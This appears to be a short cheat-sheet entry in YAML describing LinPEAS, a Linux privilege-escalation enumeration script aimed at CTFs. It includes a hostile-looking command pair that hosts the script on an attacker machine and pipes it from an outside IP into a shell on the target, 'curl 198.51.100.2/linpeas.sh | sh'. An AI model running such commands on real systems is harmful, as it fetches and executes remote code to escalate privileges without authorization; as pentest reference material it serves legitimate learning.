---
description: |
  LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix hosts. Extremely noisy but excellent for CTF.<br><br>
  Source: [github](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
functions:
  privesc:
    - description: Host script, `curl`, and run
      code: |
       sudo python3 -m http.server 80
       curl 198.51.100.2/linpeas.sh | sh
    - description: Output to file, read with colors
      code: |
       linpeas -a > /dev/shm/linpeas.txt
       less -r /dev/shm/linpeas.txt
---